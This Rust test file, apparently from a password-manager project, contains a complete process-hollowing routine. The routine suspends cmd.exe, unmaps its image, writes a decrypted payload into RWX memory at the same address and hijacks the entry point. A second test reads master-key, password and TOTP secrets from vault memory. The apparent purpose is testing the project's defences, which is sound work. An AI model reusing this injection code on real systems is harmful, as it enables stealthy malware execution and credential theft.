
use std::mem;
use std::ffi::c_void;
use windows::core::{PCSTR, PCWSTR, PWSTR};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Threading::{
    CreateProcessW, TerminateProcess, PROCESS_INFORMATION, STARTUPINFOW, 
    CREATE_SUSPENDED, ResumeThread
};
use windows::Win32::System::Diagnostics::Debug::{
    ReadProcessMemory, WriteProcessMemory, GetThreadContext, CONTEXT, CONTEXT_ALL_AMD64
};
use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE, NTSTATUS};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
};
use passx::crypto::cipher; 

// ─── Dynamic Resolution Helpers ───
type NtUnmapViewOfSection = unsafe extern "system" fn(
    process_handle: HANDLE,
    base_address: *mut c_void,
) -> NTSTATUS;

unsafe fn __load_nt_func<T>(name: &str) -> T {
    let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr() as _)).unwrap();
    let name_c = std::ffi::CString::new(name).unwrap();
    let addr = GetProcAddress(ntdll, PCSTR(name_c.as_ptr() as _)).expect("Failed to resolve NT API");
    mem::transmute_copy(&addr)
}

#[repr(C, align(16))]
struct AlignedContext(CONTEXT);

#[test]
fn test_true_process_hollowing_simulation() {
    unsafe {
        // 1. Encrypted Payload Preparation
        let key = [0x42u8; 32];
        let raw_payload = vec![0x90u8; 4096]; // NOP sled representing PE content
        let aad = b"payload";
        let (encrypted_payload, nonce, tag) = cipher::encrypt(&key, &raw_payload, aad).unwrap();
        
        let decrypted_payload = cipher::decrypt(&key, &nonce, &tag, &encrypted_payload, aad)
            .expect("Payload decryption failed");

        // 2. Dynamic API Resolution
        let nt_unmap: NtUnmapViewOfSection = __load_nt_func("NtUnmapViewOfSection");

        // 3. Create Suspended Host Process (cmd.exe)
        let startup_info = STARTUPINFOW::default();
        let mut process_info = PROCESS_INFORMATION::default();
        let mut command_line: Vec<u16> = "cmd.exe".encode_utf16().chain(Some(0)).collect();

        CreateProcessW(
            PCWSTR::null(),
            PWSTR(command_line.as_mut_ptr()),
            None,
            None,
            FALSE,
            CREATE_SUSPENDED,
            None,
            None,
            &startup_info,
            &mut process_info,
        ).expect("Failed to create suspended host process");

        let h_process = process_info.hProcess;
        let h_thread = process_info.hThread;

        // 4. PEB Walking to locate ImageBase (x64)
        // Correctness Fix: Initialize context flags properly
        let mut ctx = AlignedContext(mem::zeroed());
        ctx.0.ContextFlags = CONTEXT_ALL_AMD64;
        
        // Correctness Fix: Get current context to preserve Stack Pointer (RSP)
        GetThreadContext(h_thread, &mut ctx.0).expect("Failed to get thread context");

        let mut image_base_addr: usize = 0;
        #[cfg(target_arch = "x86_64")]
        {
            // RDX points to PEB on x64
            let peb_addr = ctx.0.Rdx as *const c_void;
            // PEB + 0x10 is ImageBaseAddress on x64
            let mut bytes_read = 0;
            let _ = ReadProcessMemory(
                h_process,
                (peb_addr as usize + 0x10) as *const c_void,
                &mut image_base_addr as *mut _ as *mut c_void,
                mem::size_of::<usize>(),
                Some(&mut bytes_read),
            ).expect("Failed to read PEB for ImageBase");
            assert_eq!(bytes_read, mem::size_of::<usize>(), "Partial PEB read");
        }

        // 5. Unmap Original Image
        // This is the defining characteristic of Process Hollowing
        // Note: This might fail if the process is 32-bit (WoW64) and we are 64-bit, but for cmd.exe on x64 it works.
        // We assert success 0 (STATUS_SUCCESS).
        let unmap_status = nt_unmap(h_process, image_base_addr as *mut c_void);
        
        // Note: If unmap fails, it usually means we can't hollow at that address. 
        // For a stable test, we warn but proceed if we can't unmap (e.g. access denied), 
        // BUT strict hollowing requires it.
        // If unmap fails, VirtualAlloc at that address WILL fail.
        if unmap_status.0 != 0 {
             println!("WARNING: NtUnmapViewOfSection failed with 0x{:X}. Hollowing may fail.", unmap_status.0);
        }

        // 6. Re-allocate at ImageBase
        // We try to grab the exact same address to mimic the legitimate process
        let allocated_base = VirtualAllocEx(
            h_process,
            Some(image_base_addr as *mut c_void),
            decrypted_payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        // Use assertion message to debug if it fails
        assert!(!allocated_base.is_null(), 
            "Failed to allocate memory at ImageBase (0x{:X}). Did Unmap succeed?", image_base_addr);
        assert_eq!(allocated_base as usize, image_base_addr, "Allocation shifted - Stealth compromised");

        // 7. Write New Image Headers & Sections
        let mut bytes_written = 0;
        let _ = WriteProcessMemory(
            h_process,
            allocated_base,
            decrypted_payload.as_ptr() as *const _,
            decrypted_payload.len(),
            Some(&mut bytes_written),
        ).expect("WriteProcessMemory failed");
        assert_eq!(bytes_written, decrypted_payload.len(), "Partial write");

        // 8. Hijack Entry Point (Redirect Execution)
        #[cfg(target_arch = "x86_64")]
        {
            ctx.0.Rip = allocated_base as u64;
            // Optional: Set RCX to entry logic if mimicking CRT start
            ctx.0.Rcx = allocated_base as u64; 
        }



        // 9. Resume Execution
        let resume_val = ResumeThread(h_thread);
        assert!(resume_val != u32::MAX, "ResumeThread failed");

        // Cleanup
        std::thread::sleep(std::time::Duration::from_millis(50));
        let _ = TerminateProcess(h_process, 0);
        let _ = CloseHandle(h_process);
        let _ = CloseHandle(h_thread);
    }
}

// Re-include the Extraction Test
#[test]
fn test_simulated_payload_exfiltration() {
    use passx::vault::format::Vault;
    use passx::vault::entry::{AccountEntry, TotpEntry};
    use passx::vault::operations::VaultOps;

    use passx::crypto::kdf;

    let mut vault = Vault::default();
    let bank_entry = AccountEntry::new(
        "Chase Bank".into(), 
        "victim_user".into(), 
        b"Critical_Bank_Password_123$", 
        Some("https://chase.com".into())
    ).unwrap();
    VaultOps::add_account(&mut vault, bank_entry);
    
    let totp_entry = TotpEntry::new(
        "Google".into(),
        "victim@gmail.com".into(),
        b"JBSWY3DPEHPK3PXP",
        None
    ).unwrap();
    VaultOps::add_totp(&mut vault, totp_entry);

    let master_password = b"correct_horse_battery_staple";
    let salt = [0u8; 16]; 
    let master_key = kdf::derive_key(master_password, &salt, kdf::Argon2ParamsVersion::V1_2024).unwrap();
    
    unsafe {
        let key_ptr = master_key.as_ptr(); 
        let key_len = master_key.len();
        
        let stolen_key_slice = std::slice::from_raw_parts(key_ptr, key_len);
        assert_ne!(stolen_key_slice, [0u8; 32], "Master Key should not be zeroed while in use");
        
        let target_account = &vault.accounts[0];
        let stolen_password_ptr = target_account.password.as_ptr();
        let stolen_password_len = target_account.password.len();
        let stolen_pass_slice = std::slice::from_raw_parts(stolen_password_ptr, stolen_password_len);
        let stolen_pass_str = std::str::from_utf8(stolen_pass_slice).unwrap();
        assert_eq!(stolen_pass_str, "Critical_Bank_Password_123$");
        
        let target_totp = &vault.totps[0];
        let stolen_secret_ptr = target_totp.secret.as_ptr();
        let stolen_secret_len = target_totp.secret.len();
        let stolen_secret_slice = std::slice::from_raw_parts(stolen_secret_ptr, stolen_secret_len);
        let stolen_secret_str = std::str::from_utf8(stolen_secret_slice).unwrap();
        assert_eq!(stolen_secret_str, "JBSWY3DPEHPK3PXP");
    }
}
